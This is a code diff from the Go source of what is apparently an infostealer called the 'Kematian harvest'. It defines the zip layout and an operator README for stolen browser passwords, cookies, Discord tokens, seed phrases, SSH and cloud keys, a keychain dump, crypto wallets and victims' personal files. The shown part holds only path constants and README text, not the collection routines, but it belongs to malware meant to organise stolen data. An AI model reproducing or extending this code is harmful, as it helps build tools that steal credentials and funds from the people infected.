@@ -1,5 +1,8 @@
-package main
-
+// export_layout.go — zip path constants and the README embedded in every harvest.
+//
+// Keep this layout in sync with Kematian Panel extractors and ARCHITECTURE.md.
+// Path prefixes below are the single source of truth for export_logs / export_files.
+//
 // Zip layout (primary harvest + scanned-files uploads):
 //
 //	summary.txt
@@ -8,7 +11,7 @@ package main
 //	logs/apps/         WiFi, FileZilla, VPN, gaming
 //	logs/discord/      discord tokens
 //	logs/seeds/        seed phrases
-//	logs/keys/         SSH/cloud keys, password candidates
+//	logs/keys/         SSH/cloud keys, password candidates, keychain_dump.txt
 //	logs/meta/         harvest.json, wallets.json, files.json, telegram.json
 //	wallets/browser-extensions/{Wallet-Browser-Profile}/...
 //	wallets/desktop/{WalletName}/...
@@ -16,6 +19,7 @@ package main
 //	files/documents/   PDF, Office, text (phase-2 zip)
 //	files/images/      photos, screenshots (phase-2 zip)
 //	files/other/       everything else (phase-2 zip)
+package main
 
 const (
 	zipLogsBrowsers     = "logs/browsers/"
@@ -28,6 +32,7 @@ const (
 	zipWalletsDesktop   = "wallets/desktop/"
 )
 
+// zipReadmeText is written to README.txt so operators opening a zip know the tree.
 func zipReadmeText() string {
 	return `Kematian harvest — folder layout
 ================================
@@ -39,7 +44,7 @@ logs/browsers/       Saved passwords, cookies, history, bookmarks, autofill, car
 logs/apps/           WiFi, FileZilla, VPN profiles, gaming accounts
 logs/discord/        Discord tokens
 logs/seeds/          Seed phrase scan results
-logs/keys/           SSH/cloud keys, password-candidate list
+logs/keys/           SSH/cloud keys, password-candidate list, keychain_dump.txt
 logs/meta/           Full harvest.json + wallet/file indexes
 
 wallets/browser-extensions/   Browser extension wallet data (MetaMask, etc.)
